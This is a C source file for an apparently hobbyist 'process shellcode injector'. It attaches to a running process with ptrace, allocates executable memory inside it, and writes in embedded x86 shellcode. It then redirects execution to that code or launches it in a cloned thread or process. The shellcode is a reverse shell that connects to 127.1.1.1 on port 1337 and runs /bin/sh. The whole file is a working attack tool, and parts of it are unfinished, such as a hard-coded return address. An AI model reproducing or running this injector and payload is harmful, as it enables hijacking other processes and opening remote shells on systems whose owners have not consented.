
#define _GNU_SOURCE

#include <unistd.h> 
#include <errno.h>
#include <stdio.h>
#include <sched.h> 
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include "utils.h"

#define SHELL_LEN 80
// char *shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
char *shellcode = "\x90\x90\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

#define FLAGS_PROCESS 	(1<<0)
#define FLAGS_DIRECT 	(1<<1)

void usage(const char *name)
{
	
	fprintf(stderr, "\tUsage: %s PID [-p -d]\n", name);
	exit(0);
}

int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	char *ptr = malloc(blen + blen % sizeof(size_t));	// word align
	memcpy(ptr, buf, blen);

	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *(size_t *)&ptr[i]) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace POKE", strerror(errno));
			exit(1);
		}
	}
	free(ptr);
	return 0;
}


int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	size_t word = 0;
	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
		memcpy(&buf[i], &word, sizeof(word));
	}
	return 0;
}


// TODO change this to search only exec pages of memory

size_t find_syscall_addr(pid_t pid, size_t addr)
{
	// assume that this will not fail
	// searching for syscall after 1kb we give up
	
	int buf_size = 1024;
	void *tmp_ptr;

	char *syscall_op = "\xcd\x80"; 
	char *buf = malloc(buf_size);
	addr -= buf_size;
	peek_text(pid, addr, buf, buf_size);
	tmp_ptr = buf;

	while(memcmp(tmp_ptr, syscall_op, 2))
	{
		tmp_ptr++;
		//printf("addr:%lx\n", addr -((size_t)buf- (size_t)tmp_ptr) );
		if (buf_size-- == 0)
		{
			free(buf);
			return (size_t) NULL;
		}
	}
	free(buf);
	return addr - ((size_t)buf- (size_t)tmp_ptr) ; //addr + offset to syscall
}


/*
void run_shellcode(pid_t pid, void *shellcode, size_t len)
{
	struct user_regs_struct regs, return_regs;
	
	// get rip, save regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		perror("ptrace get regs");
		exit(1);
	}


	peek_text(pid, regs.rip, saved_text, syscall_len);

	// restore regs

}
*/

void remote_jmp(pid_t pid, void *addr)
{
	
	struct user_regs_struct regs;
	
	
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	regs.eip = (uint32_t) addr;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
}

uint32_t remote_syscall(pid_t pid, uint32_t eax, uint32_t ebx, uint32_t ecx, uint32_t edx, uint32_t esi, uint32_t edi, uint32_t ebp)
{
	
	struct user_regs_struct regs, return_regs;

	bool substitute = false;	
	
	char saved_text[2];
   	char *syscall_opt = "\xcd\x80";
	int syscall_len = 2;


	// save	orginal regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// prepare regs for call
	memcpy(&return_regs, &regs, sizeof(struct user_regs_struct));
	return_regs.eax = eax;
	return_regs.ebx = ebx;
	return_regs.ecx = ecx;
	return_regs.edx = edx;
	return_regs.esi = esi;
	return_regs.edi = edi;
	return_regs.ebp = ebp;

	// 0x2a855
	// void *ret =  (void *)0x2a855 + 0xff1000;
	void *ret =  (void *)0x0804888d;
	if (ret == NULL)
	{
		logs(LOG_WARNING, "cant find any syscall, using substitution method");
		
		peek_text(pid, regs.eip, saved_text, syscall_len);
		substitute = true; 
	}
	else
	{
		return_regs.eip = (uint32_t) ret;
	}


	// load syscall
	if (ptrace(PTRACE_SETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute){ poke_text(pid, regs.eip, syscall_opt, syscall_len); }

	// exec
	if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
		exit(1);
	}
	waitpid(pid, NULL, 0);
	
	
	// get return val
	if (ptrace(PTRACE_GETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}


	// restore orginal
	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute){ poke_text(pid, regs.eip, saved_text, syscall_len); }

	logs(LOG_DEGBUG, "[0x%02x] syscall ret: 0x%x", eax, return_regs.eax);

	return return_regs.eax;
}

void debug_exec(pid_t pid)
{
	struct user_regs_struct regs;

	for (int i = 0; i < 50; i++)
	{
			// get return val
		if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
			exit(1);
		}
		printf("eax: %x, ebx: %x, ecx: %x, edx: %x, ebp: %x, esp: %x, edi: %x, esi: %x, eip: %x\n", 
			regs.eax,
			regs.ebx,
			regs.ecx,
			regs.edx,
			regs.ebp,
			regs.esp,
			regs.edi,
			regs.esi,
			regs.eip);
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
			exit(1);
		}
		waitpid(pid, NULL, 0);
	}
}

// some remote syscalls prototypes

void *remote_mmap(pid_t pid, void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
	return (void *) remote_syscall(pid, 192, (uint32_t)addr, (uint32_t)len, (uint32_t)prot, (uint32_t)flags, (uint32_t) fd, (uint32_t) offset);
}

void *remote_mprotect(pid_t pid, void *addr, size_t len, int prot)
{
	return (void *) remote_syscall(pid, SYS_mprotect, (uint32_t)addr, (uint32_t)len, (uint32_t)prot, (uint32_t) NULL, (uint32_t) NULL, (uint32_t) NULL);
}

int  remote_write(pid_t pid, int fd, const void *buf, size_t count)
{
	return (int) remote_syscall(pid, SYS_write, (uint32_t) fd, (uint32_t) buf, (uint32_t) count, (uint32_t) NULL,(uint32_t) NULL, (uint32_t) NULL);
}

uint32_t remote_clone(pid_t pid, int flags, void *child_stack)
{
	return remote_syscall(pid, SYS_clone, (uint32_t)flags, (uint32_t)child_stack, (uint32_t) NULL, (uint32_t) NULL,(uint32_t) NULL,(uint32_t) NULL);
}


int main(int argc, char *argv[])
{

	pid_t pid;
   	int wstatus, opt, flags=0;
	struct user_regs_struct regs;
	bool main_arg = false;
	
	
	fprintf(stderr, "\n\033[96m\t***************************************\n\t*  Adun - process shellcode injector  *\n\t***************************************\n\n\033[0m");
	
	// parse
	while ((opt = getopt(argc, argv, "pd")) != -1) 
	{
		switch(opt)
		{
			case 'p':
				flags |= FLAGS_PROCESS;
				break;
			case 'd':
				flags |= FLAGS_DIRECT;
				break;	
			default:
				usage(argv[0]);
		}
	}
	
	for(int i=0;i<argc;i++)
	{

		if( argv[i][0] != '-')
		{
			if ((pid = (pid_t)atoi(argv[i])) != 0) 
			{
				break;
			}
		}
		if (i==(argc))
		{
			usage(argv[0]);
		}
	}
	// 					if these 2 bits are set
	if ((pid == 0) || ( (flags & FLAGS_PROCESS) && (flags & FLAGS_DIRECT)))
	{
		usage(argv[0]);
	}


	// main functionality

	logs(LOG_DEGBUG, "attaching to proccess ( id: %d )", pid);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace", strerror(errno));
		exit(1);
	}
	waitpid(pid, &wstatus, 0);

	logs(LOG_DEGBUG, "allocating memory");
	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	logs(LOG_DEGBUG, "mem_addr: %p", mem_addr);
	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	logs(LOG_DEGBUG, "stack_addr: %p", stack_addr);
	void *stack_top = stack_addr + 4096;
	pid_t ret_pid;

	logs(LOG_DEGBUG, "copying shellcode ( %d bytes )", SHELL_LEN);
	poke_text(pid, (size_t) mem_addr, shellcode, SHELL_LEN);	
	
	// logs(LOG_DEGBUG, "setting memory permissions");
	// remote_mprotect(pid, mem_addr, 4096, PROT_READ | PROT_EXEC);
	
	if(flags & FLAGS_DIRECT)
	{
		// direct shellcode execution
		logs(LOG_DEGBUG, "redirecting execution flow to shellcode");
		remote_jmp(pid, mem_addr + 2);
		getchar();
		debug_exec(pid);
		
		logs(LOG_DEGBUG, "detaching");
		if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
			logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
			exit(1);
		}

		logs(LOG_DEGBUG, "done");
		return 0;
	}

	// else prepare stack to spawn process/thread
	logs(LOG_DEGBUG, "setting up child's stack");
	poke_text(pid, (size_t) stack_addr, (char *)&mem_addr, sizeof(void *));	

	if(flags & FLAGS_PROCESS)
	{
		// spawn new process
		logs(LOG_DEGBUG, "starting new process");
		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_VM, stack_top);
		logs(LOG_DEGBUG, "ret_pid: %d", ret_pid);
	}
	else
	{
		// spawn new thread
		logs(LOG_DEGBUG, "starting new thread");
		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_THREAD | CLONE_FS | CLONE_FILES, stack_top);
		logs(LOG_DEGBUG, "ret_pid: %d", ret_pid);
	}

	// getchar();
	sleep(3);

	logs(LOG_DEGBUG, "running shellcode");
	remote_jmp(ret_pid, mem_addr);

	// debug_exec(ret_pid);

	logs(LOG_DEGBUG, "detaching");
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}
	
	if (ptrace(PTRACE_DETACH, ret_pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}
	

	logs(LOG_DEGBUG, "done");

	return 0;
}
